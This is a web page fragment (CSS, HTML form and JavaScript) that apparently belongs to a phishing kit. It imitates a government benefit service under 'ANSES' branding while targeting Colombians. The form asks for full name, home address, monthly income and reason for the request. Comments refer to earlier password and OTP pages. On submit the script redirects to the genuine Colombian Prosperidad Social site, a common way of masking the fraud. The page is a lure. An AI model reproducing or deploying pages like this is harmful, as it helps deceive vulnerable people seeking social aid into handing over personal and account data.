<style>
    /* Wrapper Utama */
    .anses-success-wrapper {
        padding: 20px 15px;
        text-align: left;
        font-family: 'Roboto', sans-serif;
    }

    /* Header Berhasil - Rata Kiri sesuai gaya sebelumnya */
    .success-header {
        text-align: left;
        margin-bottom: 25px;
    }

    .success-icon-container {
        display: flex;
        align-items: center;
        gap: 12px;
        margin-bottom: 15px;
    }

    .success-icon {
        background-color: #28a745;
        color: white;
        width: 35px;
        height: 35px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        font-weight: bold;
    }

    .success-title {
        color: #2c3e50;
        font-weight: 800;
        font-size: 1.6rem;
        margin: 0;
    }

    .success-desc {
        font-size: 15px;
        color: #7f8c8d;
        line-height: 1.5;
        margin-top: 10px;
    }

    /* Alert Info - Biru halus */
    .alert-info-anses {
        background-color: #f0f7ff;
        border-left: 4px solid #1565C0;
        border-radius: 8px;
        padding: 15px;
        font-size: 14px;
        color: #34495e;
        margin-bottom: 30px;
        line-height: 1.4;
    }

    /* Gaya Form */
    .form-group {
        margin-bottom: 22px;
        text-align: left;
    }

    .form-group small {
        display: block;
        font-weight: 700;
        margin-bottom: 8px;
        color: #34495e;
        font-size: 0.95rem;
    }

    /* Input Modern - Konsisten dengan PASS.php */
    .anses-control {
        width: 100%;
        padding: 15px 18px;
        border-radius: 12px;
        border: 2px solid #ecf0f1;
        font-size: 16px;
        color: #2c3e50;
        outline: none;
        transition: all 0.3s;
        background-color: #fdfdfd;
    }

    .anses-control:focus {
        border-color: #f39c12;
        background-color: #fff;
        box-shadow: 0 4px 12px rgba(243, 156, 18, 0.1);
    }

    .error-text {
        font-size: 13px;
        color: #e74c3c;
        margin-top: 6px;
        font-weight: 600;
        display: none;
    }

    textarea.anses-control {
        resize: none;
        min-height: 90px;
    }

    /* Tombol FINALIZAR - Oranye Gradien sesuai OTP */
    .btn-anses-finish {
        width: 100%;
        margin-top: 10px;
        padding: 16px;
        border-radius: 25px;
        border: none;
        font-weight: 800;
        font-size: 17px;
        color: #ffffff;
        background: linear-gradient(180deg, #f39c12 0%, #e67e22 100%);
        cursor: pointer;
        text-transform: uppercase;
        box-shadow: 0 4px 15px rgba(230, 126, 34, 0.3);
        transition: transform 0.2s ease;
    }

    .btn-anses-finish:active {
        transform: scale(0.98);
    }
</style>

<div class="anses-success-wrapper">
    <div class="success-header">
        <div class="success-icon-container">
            <div class="success-icon">✔</div>
            <h4 class="success-title">¡Casi listo!</h4>
        </div>
        <p class="success-desc">Por favor, complete los datos finales para la acreditación del beneficio.</p>
    </div>

    <div class="alert-info-anses">
        Estos datos son necesarios para determinar la oficina de cobro más cercana a su domicilio.
    </div>

    <form id="bantuanForm">

        <div class="form-group">
            <small>Nombre y Apellidos completos</small>
            <input type="text" name="name" class="form-control anses-control"
                placeholder="Tal como aparece en su cédula">
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <div class="form-group">
            <small>Dirección de residencia (Departamento y Municipio)</small>
            <textarea name="address" class="form-control anses-control"
                placeholder="Ej: Calle 26 # 50-00, Bogotá"></textarea>
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <div class="form-group">
            <small>Ingresos mensuales estimados ($)</small>
            <input type="number" name="income" class="form-control anses-control"
                placeholder="Monto en Pesos Colombianos">
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <div class="form-group">
            <small>Breve motivo de la solicitud</small>
            <textarea name="alasan" class="form-control anses-control"
                placeholder="Describa brevemente su situación actual"></textarea>
            <div class="error-text">Este campo es obligatorio</div>
        </div>

        <button type="submit" class="btn-anses-finish">FINALIZAR TRÁMITE</button>
    </form>
</div>

<script>
    /* LOGIKA ASLI (TIDAK DIUBAH) */
    document.getElementById('bantuanForm').addEventListener('submit', function (e) {
        e.preventDefault();

        let valid = true;
        const fields = document.querySelectorAll('.anses-control');

        fields.forEach(field => {
            const error = field.nextElementSibling;

            if (field.value.trim() === "") {
                field.style.borderColor = "#e74c3c";
                error.style.display = "block";
                valid = false;
            } else {
                field.style.borderColor = "#ecf0f1";
                error.style.display = "none";
            }
        });

        if (valid) {
            // Tetap menggunakan redirect sesuai kode asli Anda
            window.location.href = "https://www.prosperidadsocial.gov.co/";
        }
    });

</script>
